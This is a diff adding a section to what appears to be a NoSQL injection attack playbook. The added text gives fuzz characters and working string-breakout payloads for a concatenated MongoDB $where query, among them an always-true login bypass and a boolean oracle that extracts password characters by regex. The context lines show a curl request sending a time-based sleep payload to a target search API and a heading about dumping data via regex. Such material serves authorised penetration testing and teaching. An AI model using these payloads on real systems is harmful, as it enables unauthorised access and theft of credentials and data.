@@ -92,6 +92,15 @@ curl -s -X POST https://$TARGET/api/search \
   -d '{"q": {"$where": "function(){if(this.username.match(/^a/)){sleep(3000);} return true;}"}}'
 ```
 
+### Phase 3b — Syntax injection into a concatenated `$where`/query (string context)
+When the app concatenates input into a JS `$where` STRING (`"this.name=='"+input+"'"`) instead of accepting an operator object, break the string rather than passing `$gt`/`$ne`. Fuzz first, then break:
+```
+fuzz:  ' " ` { ; $         # any 500/behaviour change = syntax reaches the query
+' || '1'=='1               # always-true (string-context breakout)
+' && this.password.match(/^a/) || 'x'=='y   # boolean char-exfil oracle
+```
+(PortSwigger: Injecting syntax into NoSQL queries.)
+
 ### Phase 4 — Data Dump via Regex
 ```bash
 # Enumerate usernames character by character
